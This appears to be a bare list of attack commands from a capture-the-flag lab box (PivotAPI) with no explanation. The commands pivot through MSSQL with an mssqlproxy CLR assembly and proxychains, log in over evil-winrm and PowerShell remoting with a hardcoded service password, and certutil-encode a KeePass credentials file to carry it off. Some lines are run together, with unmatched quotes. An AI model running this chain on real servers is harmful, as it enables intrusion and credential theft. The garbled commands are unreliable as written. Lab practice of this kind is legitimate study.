
python3 mssqlclient.py sa@10.129.228.115 -start reciclador 'C:\windows\temp\reciclador.dll python3 mssqlclient.py sa@10.129.228.115 -install clr Microsoft.SqlServer.Proxy.dll
git clone https://github.com/0xdf-Oxdf/mssqlproxy -b python3
proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p #mssql_s3rV1c3!2020'
mv assembly.dll Microsoft.SqlServer.Proxy.dll
sudo nano /etc/proxychains.conf
10.129.228.115 PIVOTAPI LicorDeBellota.htb PIVOTAPI.LicorDeBellota.htb
socks5 127.0.0.1 1337
powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -force;$cred = new-object system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
command -computername 127.0.0.1 -credential $cred -scriptblock {whoami}"

powershell -c "$pass = convertto-securestring '#mssql_s3rV1c3!2020' -asplaintext -
force;$cred = new-object
system.management.automation.pscredential('licordebellota\svc_mssql', $pass);invoke-
command -computername 127.0.0.1 -credential $cred -scriptblock {certutil -encode
C:\users\svc_mssql\desktop\credentials.kdbx C:\temp\credentials.out}"

echo "A9mi<SNIP>JJ6" | base64 -d > credentials.kdbx
